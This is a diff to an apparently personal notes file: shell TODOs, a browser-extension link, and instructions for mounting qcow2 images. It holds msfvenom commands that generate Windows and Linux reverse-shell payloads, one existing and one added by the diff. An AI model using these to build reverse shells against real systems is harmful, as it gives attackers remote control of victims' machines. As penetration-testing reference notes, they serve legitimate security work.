@@ -8,6 +8,8 @@ TODO - execute script on shutdown
         script in /bin/clean_home
 TODO - Kioku: Rename 'Shell' skill to Bash and create a new Shell skill with cmnd line utilities
 TODO - I want a shell TRAP @ work that broadcasts a defined variable to all open terminals
+TODO - check what I got in store PHP wise @ root (with PsySH)
+TODO - for Python relevant stuff make a Notebook rather than a .md file (Python.md)
 
 
 ## BSS section
@@ -31,6 +33,12 @@ https://tridactyl.cmcaine.co.uk/betas/tridactyl-latest.xpi
 ## Windows reverse shell
 msfvenom -p windows/shell_reverse_tcp LHOST=eth0 LPORT=8080 EXITFUNC=thread \
 -f raw -b "\x00\x09\x0d\x0a\x20\xff" -n 32 > warhead.txt
+## Linux reverse shell
+msfvenom -p linux/x64/shell_reverse_tcp \ # Specify the payload
+            LHOST=127.0.0.1             \ # Target host to connect
+            LPORT=4444                  \ # Target port
+         -b '\x00'                      \ # Bad characters
+         -f python                        # Format of the payload
 
 ### Mount qcow2 files
 modprobe nbd
